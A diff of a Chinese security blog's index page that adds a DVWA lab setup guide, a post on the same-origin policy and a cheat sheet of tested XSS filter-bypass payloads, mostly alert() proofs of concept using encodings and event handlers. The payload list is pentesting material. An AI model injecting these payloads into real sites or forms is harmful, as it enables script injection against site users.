@@ -121,108 +121,132 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15453705663839.html">
+                <a class="clearlink" href="15446897185202.html">
                 
-                  <h1>fsarchiver备份文件介绍</h1>
+                  <h1>从零开始的DVWA之环境搭建</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>多年以前的笔记</p>
+<p>文章写于2017年7月6日，很久之前的东西了。</p>
 </blockquote>
 
-<p>fsarchiver安装<br/>
-<code>apt-get install fsarchiver</code></p>
+<h2 id="toc_0">0X01 主机配置</h2>
 
-<pre class="line-numbers"><code class="language-text"># 对于备份操作，我们需要以只读形式重新挂载文件系统或者有条件的话直接卸载。也可以-A忽略
-[peter@test88 ~]$ sudo /home/peter/fsarchiver savefs backup.fsa /dev/sdb1
-oper_save.c#938,filesystem_mount_partition(): partition [/dev/sdb1] is mounted read/write. please mount it read-only
-and then try again. you can do &quot;mount -o remount,ro /dev/sdb1&quot;. you can
-also run fsarchiver with option &#39;-A&#39; if you know what you are doing.
-removed backup.fsa
- 
-# 对于恢复操作，我们必须先卸载文件系统。
-[peter@test88 ~]$ sudo /home/peter/fsarchiver restfs backup2.fsa id=0,dest=/dev/sdb2
-oper_restore.c#1230,extractar_filesystem_extract(): partition [/dev/sdb2] is mounted on [/home/peter/sder].
-cannot restore an archive to a partition which is mounted, unmount it first: umount /home/peter/sder
- 
-# 创建文件系统备份
-# 可以将多个文件系统备份在一个文件中
-[peter@test88 ~]$ sudo /home/peter/fsarchiver savefs backup.fsa /dev/sdb1 /dev/sdb2
- 
-# 恢复文件系统
-# id=0表明从归档中提取第一个文件系统的内容
-[peter@test88 ~]$ sudo /home/peter/fsarchiver restfs backup.fsa id=0,dest=/dev/sdc1 id=1,dest=/dev/sdc2
+<p>　　操作系统：Ubuntu-Kylin-16.04-LTS_x64（VritualBox虚拟机）<br/><br/>
+　　相关组件：XAMPP+DVWA    </p>
 
+<h2 id="toc_1">0X02 DVWA简介</h2>
 
+<p>　　DVWA是一个用来进行安全脆弱性鉴定（练习挖洞）的PHP/MySQL应用。旨在帮助安全爱好者（黑客白客红客白帽子黑帽子绿帽子等）测试自己的专业技能和工具提供合法的环境（不要瞎搞别人网站，这样不好...），提升技术能力的同时更好的维护比特世界的和平。       </p>
 
-# 软件说明文档
-====&gt; fsarchiver version 0.8.1 (2017-01-10) - http://www.fsarchiver.org &lt;====           
-Distributed under the GPL v2 license (GNU General Public License v2).                   
- * usage: fsarchiver [&lt;options&gt;] &lt;command&gt; &lt;archive&gt; [&lt;dev1&gt; [&lt;dev2&gt; [...]]]            
-&lt;commands&gt;                                                                              
- * savefs: save filesystems to an archive file (backup a device to a file)              
- * restfs: restore filesystems from an archive (overwrites the existing data)           
- * savedir: save directories to the archive (similar to a compressed tarball)           
- * restdir: restore data from an archive which is not based on a filesystem             
- * archinfo: show information about an existing archive file and its contents           
- * probe [detailed]: show list of filesystems detected on the disks                     
-&lt;options&gt;                                                                               
- -o: overwrite the archive if it already exists instead of failing                      
- -v: verbose mode (can be used several times to increase the level of details)          
- -d: debug mode (can be used several times to increase the level of details)            
- -A: allow to save a filesystem which is mounted in read-write (live backup)            
- -a: allow to save a filesystem when acls and xattrs are not supported                  
- -x: enable support for experimental features (they are disabled by default)            
- -e &lt;pattern&gt;: exclude files and directories that match that pattern                    
- -L &lt;label&gt;: set the label of the archive (comment about the contents)                  
- -z &lt;level&gt;: compression level from 1 (very fast) to 9 (very good) default=3            
- -s &lt;mbsize&gt;: split the archive into several files of &lt;mbsize&gt; megabytes each           
- -j &lt;count&gt;: create more than one (de)compression thread. useful on multi-core cpu      
- -c &lt;password&gt;: encrypt/decrypt data in archive, &quot;-c -&quot; for interactive password        
- -h: show help and information about how to use fsarchiver with examples                
- -V: show program version and exit                                                      
-&lt;information&gt;                                                                           
- * Support included for: lzo=yes, lzma=yes                                              
- * Support for ntfs filesystems is unstable: don&#39;t use it for production.               
-&lt;examples&gt;                                                                              
- * save only one filesystem (/dev/sda1) to an archive:                                  
-   fsarchiver savefs /data/myarchive1.fsa /dev/sda1                                     
- * save two filesystems (/dev/sda1 and /dev/sdb1) to an archive:
-   fsarchiver savefs /data/myarchive2.fsa /dev/sda1 /dev/sdb1
- * restore the first filesystem from an archive (first = number 0):
-   fsarchiver restfs /data/myarchive2.fsa id=0,dest=/dev/sda1
- * restore the second filesystem from an archive (second = number 1):
-   fsarchiver restfs /data/myarchive2.fsa id=1,dest=/dev/sdb1
- * restore two filesystems from an archive (number 0 and 1):
-   fsarchiver restfs /data/arch2.fsa id=0,dest=/dev/sda1 id=1,dest=/dev/sdb1
- * restore a filesystem from an archive and convert it to reiserfs:
-   fsarchiver restfs /data/myarchive1.fsa id=0,dest=/dev/sda1,mkfs=reiserfs
- * restore a filesystem from an archive and specify extra mkfs options:
-   fsarchiver restfs /data/myarchive1.fsa id=0,dest=/dev/sda1,mkfs=ext4,mkfsopt=&quot;-I 256&quot;
- * restore a filesystem from an archive and specify a new label and a new UUID:
-   fsarchiver restfs /data/myarchive1.fsa id=0,dest=/dev/sda1,label=root,uuid=5f6e5f4f-dc2a-4dbd-a6ea-9ca997cde75e
- * save the contents of /usr/src/linux to an archive (similar to tar):
-   fsarchiver savedir /data/linux-sources.fsa /usr/src/linux
- * save a filesystem (/dev/sda1) to an archive split into volumes of 680MB:
-   fsarchiver savefs -s 680 /data/myarchive1.fsa /dev/sda1
- * save a filesystem and exclude all files/dirs called &#39;pagefile.*&#39;:
-   fsarchiver savefs /data/myarchive.fsa /dev/sda1 --exclude=&#39;pagefile.*&#39;
- * generic exclude for &#39;share&#39; such as &#39;/usr/share&#39; and &#39;/usr/local/share&#39;:
-   fsarchiver savefs /data/myarchive.fsa --exclude=share
- * absolute exclude valid for &#39;/usr/share&#39; but not for &#39;/usr/local/share&#39;:
-   fsarchiver savefs /data/myarchive.fsa --exclude=/usr/share
- * save a filesystem (/dev/sda1) to an encrypted archive:
-   fsarchiver savefs -c mypassword /data/myarchive1.fsa /dev/sda1
- * same as before but prompt for password in the terminal:
-   fsarchiver savefs -c - /data/myarchive1.fsa /dev/sda1
- * extract an archive made of simple files to /tmp/extract:
-   fsarchiver restdir /data/linux-sources.fsa /tmp/extract
- * show information about an archive and its filesystems:
-   fsarchiver archinfo /data/myarchive2.fsa
-   ```
+<h2 id="toc_2">0X03 XAMPP简介</h2>
+
+<p>　　XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。由于DWVA需要PHP环境，嗯，就由XAMMP来守护了。    </p>
+
+<h2 id="toc_3">0X04 XAMPP和DVWA安装</h2>
+
+<p>　　首先访问官网 <a href="https://www.apachefriends.org/zh_cn/download.html">https://www.apachefriends.org/zh_cn/download.html</a> 然后点击下载：<br/><br/>
+<img src="media/15446897185202/1.png" alt="1"/></p>
+
+<p>接着就会弹个框：<br/><br/>
+<img src="media/15446897185202/2.png" alt="2"/></p>
+
+<p>去一趟茅房回来就下完了，你要是嫌弃7下的太慢，可以去下5.6，速度会快些，接着就是安装。　　　　<br/>
+　　安装过程如下（记得加权限，然后）：　　　　<br/>
+<img src="media/15446897185202/3.png" alt="3"/><br/>
+　　　　<br/>
+<img src="media/15446897185202/4.png" alt="4"/><br/>
+　<br/>
+一直点击next就行了……　　　　<br/>
+<img src="media/15446897185202/5.png" alt="5"/><br/>
+　　　<br/>
+　　这里告诉我们XAMPP被安装在/opt/lampp文件（linux一切皆文件）里面。最后点击Finish就完成了安装。<br/><br/>
+启动XAMPP    </p>
+
+<pre class="line-numbers"><code class="language-shell">#cd /opt/lampp
+#./manager-linxu-x64.run
+或者
+#/opt/lamp/./manage-linux-x64.run  
 </code></pre>
+
+<p><img src="media/15446897185202/6.png" alt="6"/></p>
+
+<p>下面我们开始安装DWVA：<br/><br/>
+　　首先我们登录官网 <a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a> 点击DOWNLOAD下载最新版的DWVA，是一个zip文件。<br/><br/>
+<img src="media/15446897185202/7.png" alt="7"/></p>
+
+<p>然后将文件解压（提取）到/opt/lamp/htdocs/目录下<br/><br/>
+<img src="media/15446897185202/8.png" alt="8"/></p>
+
+<p><img src="media/15446897185202/9.png" alt="9"/></p>
+
+<p>接着我们打开XAMPP的MySQL（默认只开了Apache）<br/><br/>
+<img src="media/15446897185202/10.png" alt="10"/></p>
+
+<p>然后访问 http://localhost/DVWA-master/index.php 诶!?报错<br/><br/>
+<img src="media/15446897185202/11.png" alt="11"/></p>
+
+<p>　　嗯，根据报错信息可知是配置文件有问题（废话啰），同样的根据提示我们知道要将文件名config.inc.php.dist改为config.inc.php（这里其实涉及到一个linux命令copy的用法，具体可自行百度： <a href="http://www.linuxdiyf.com/viewarticle.php?id=38590">http://www.linuxdiyf.com/viewarticle.php?id=38590</a> ）。改完名字之后就可以访问了，页面会自动跳转到： http://localhost/DVWA-master/setup.php 。然后我们用gedit打开这个文件config.inc.php看看是个什么东西，(⊙o⊙)哦原来是配置文件（废话连篇有木有），我们修改两个地方（1、数据库密码，我知道玩lol的你输入这个密码肯定飞快，不过我是玩dota的。2、安全等级设置为low，简单点容易玩，默认是难的。）     　<br/><br/>
+<img src="media/15446897185202/12.png" alt="12"/></p>
+
+<p>打开之后长这样：<br/><br/>
+<img src="media/15446897185202/13.png" alt="13"/></p>
+
+<p>怎么玩呢？我不知道啊，于是我瞎点了几下，<br/><br/>
+<img src="media/15446897185202/14.png" alt="14"/></p>
+
+<p>MMP又报错了，根据提示我们知道问题出在red部分,嗯，我们去修改一下所有带红色的地方的配置。<br/><br/>
+1、搞定PHP function allow_url_include：Disabled<br/><br/>
+找到php的配置文件，修改allow_url_include=Off 为allow_url_include=on（参考<a href="http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include%EF%BC%89">http://php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include）</a><br/><br/>
+<img src="media/15446897185202/15.png" alt="15"/></p>
+
+<p>然后修改/opt/lamp/etc/php.ini<br/><br/>
+<img src="media/15446897185202/16.png" alt="16"/></p>
+
+<p>2、解决reCAPTCHA key，配置文件里面有个谷歌连接，点进去剩下的估计你也看得懂应该知道该怎么做额。<br/><br/>
+<img src="media/15446897185202/17.png" alt="17"/></p>
+
+<p><img src="media/15446897185202/18.png" alt="18"/></p>
+
+<p>3、解决最后的两个NO<br/><br/>
+<img src="media/15446897185202/19.png" alt="19"/></p>
+
+<p>我们给这两个文件加权，运行命令：<br/><br/>
+<img src="media/15446897185202/20.png" alt="20"/></p>
+
+<p>然后点击<br/><br/>
+<img src="media/15446897185202/21.png" alt="21"/></p>
+
+<p>纳尼!?<br/><br/>
+<img src="media/15446897185202/22.png" alt="22"/></p>
+
+<p>只好回头再看看XAMPP的数据库配置文件，你会发现他的password默认是被注释了，我们取消注释。<br/><br/>
+<img src="media/15446897185202/23.png" alt="23"/></p>
+
+<p>最后你会发现不管怎么搞还是报错……这就尴尬了……<br/>
+经过尝试，我发现以下配置可以进入登录界面。<br/>
+XAMPP配置如下：<br/><br/>
+<img src="media/15446897185202/24.png" alt="24"/></p>
+
+<p>密码还是按照默认的注释掉<br/><br/>
+<img src="media/15446897185202/25.png" alt="25"/></p>
+
+<p>DVWA配置如下：<br/><br/>
+<img src="media/15446897185202/26.png" alt="26"/></p>
+
+<p>接着你就能进入登录界面了。恭喜！<br/>
+http://localhost/DVWA-master/login.php<br/><br/>
+<img src="media/15446897185202/27.png" alt="27"/></p>
+
+<p>输入账号密码然后登录就能愉快的玩耍了。<br/><br/>
+<img src="media/15446897185202/28.png" alt="28"/></p>
+
+<p>什么？你进不去？账号密码是什么？预知后事如何，请听下回分解。    </p>
+
+<p>下集预告：<br/><br/>
+　　欢迎来到DVWA的世界，这是你的第一关，登录破解…… </p>
 
                         
                       </div>
@@ -231,10 +255,202 @@ Distributed under the GPL v2 license (GNU General Public License v2).
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/21 13:36 下午</span>
+                    <span class="date">2018/12/13 16:28 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='Linux.html'>Linux</a></span>
+          					    <span class="posted-in"><a href='%E8%99%9A%E6%8B%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4.html'>虚拟实验室</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446893463166.html">
+                
+                  <h1>xss常用payload</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
+</blockquote>
+
+<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>
+
+<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>
+
+<p>1.大小写混合绕过<br/>
+顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>
+
+<p>2.闭合标签绕过</p>
+
+<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>
+
+<p>3.HEX编码来绕过</p>
+
+<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>
+
+<p>4.Javascript URL</p>
+
+<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>
+
+<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>
+
+<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>
+
+<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>
+
+<p>===&gt;常用代码如下：</p>
+
+<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
+
+<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+
+<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>
+
+<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>
+
+<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>
+
+<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>
+
+<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>
+
+<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>
+
+<p><code>&lt;a onclick=alert(4)&gt;h</code></p>
+
+<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>
+
+<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>
+
+<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>
+
+<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>
+
+<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>
+
+<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>
+
+<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>
+
+<p><code>&lt;body/onload=alert(12)&gt;</code></p>
+
+<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>
+
+<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>
+
+<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>
+
+<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>
+
+<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>
+
+<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>
+
+<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>
+
+<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:22 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446892905759.html">
+                
+                  <h1>同源策略</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>摘自网络，出处忘了。</p>
+</blockquote>
+
+<p>同源策略（SOP，Same Origin Policy），两个页面的【协议】【域名】【端口】都相同，则两个页面具有相同的源，任何一个不同都是不同源的。<br/>
+举例：<br/>
+假设源是：<code>http://store.company.com/dir/page.html</code><br/>
+同源的是：<br/>
+<code>http://store.company.com/dir2/other.html</code><br/>
+<code>http://store.company.com/dir/inner/another.html</code><br/>
+不同源的是：<br/>
+<code>https://store.company.com/secure.html</code> 不同协议 ( https和http )<br/>
+<code>http://store.company.com:81/dir/etc.html</code> 不同端口 ( 81和80)<br/>
+<code>http://news.company.com/dir/other.html</code> 不同域名 ( news和store )</p>
+
+<h2 id="toc_0">同源策略控制内容</h2>
+
+<p><em>同源策略是禁止读取HTTP回复，并不会禁止脚本执行，也不会禁止HTTP请求，因此在防御CSRF上作用是非常有限的，因为CSRF在请求发出的时候就已经达到了攻击的目的。</em><br/>
+一般情况下，静态资源通常不受同源策略限制，如有js/css/jpg/png等。</p>
+
+<p>同源策略控制了不同源之间的交互，例如在使用<code>XMLHttpRequest</code>或<code>img</code>标签时则会受到同源策略的约束，这些交互通常分为三类。</p>
+
+<ul>
+<li>通常允许跨域写（Cross-origin writes），例如链接（links），重定向以及表单提交。少数特定的HTTP请求需要添加&quot;预检请求&quot;<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests">preflight</a>如OPTIONS来查询可用的方法。</li>
+<li>通常允许跨域资源嵌入（Cross-origin embedding）</li>
+<li>通常 <strong>不允许</strong> 跨域读（Cross-origin reads），但常可以通过内嵌资源来巧妙的进行读取访问。例如可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法，或<a href="https://www.grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">availability of an embedded resource</a></li>
+</ul>
+
+<p>下面是可能嵌入跨域资源的示例：<br/>
+<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。<br/>
+<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的<a href="http://scarybeastsecurity.blogspot.dk/2009/12/generic-cross-browser-cross-domain.html">松散的语法规则</a>，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622939(v=vs.85)">IE</a>, <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2010-46/">Firefox</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=9877">Chrome</a>, <a href="https://support.apple.com/zh-cn/HT4070">Safari</a> (跳至CVE-2010-0051)部分 和 <a href="https://security.opera.com/">Opera</a>。<br/>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img"><code>&lt;img&gt;</code></a>嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...<br/>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video"><code>&lt;video&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio"><code>&lt;audio&gt;</code></a>嵌入多媒体资源。<br/>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object"><code>&lt;object&gt;</code></a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed"><code>&lt;embed&gt;</code></a> 和 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet"><code>&lt;applet&gt;</code></a> 的插件。<br/>
+<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@font-face">@font-face</a> 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。<br/>
+<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame"><code>&lt;frame&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code></a> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:21 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
           				   
                   </div>
                   <div class="more-right right">
